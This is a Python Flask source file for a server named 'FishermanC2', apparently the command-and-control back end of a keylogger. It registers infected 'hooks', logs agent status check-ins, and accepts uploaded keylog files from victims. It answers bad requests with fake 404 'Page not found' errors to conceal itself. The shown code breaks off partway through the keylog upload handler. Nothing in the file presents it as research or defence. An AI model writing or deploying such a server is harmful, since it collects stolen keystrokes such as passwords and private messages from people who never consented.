from flask import Flask, send_file, request, abort
from db.db import HookDB

app = Flask(__name__)
hooksDB = HookDB()

HIDE_PAGE_MESSAGE = (404, 'Page not found')


@app.route('/')
def index():
    return 'FishermanC2'


@app.route('/hook')
def hook():
    return str(hooksDB.register_hook())


@app.route('/<agentId>/status', methods=['GET'])
def keeper(agentId):
    status = request.args.get('status')
    if status == 'ok':
        app.logger.info('%s is ok', agentId)
    else:
        app.logger.error('%s is having issues', agentId)

    return 'ok'


@app.route('/keylogs', methods=['POST'])
def keylogger():
    if 'file' not in request.files:
        abort(404)
    chunked_keylog = request.files['file']
    try:
        serial_number = int(chunked_keylog.filename)
    except Exception as e:
        abort(*HIDE_PAGE_MESSAGE)
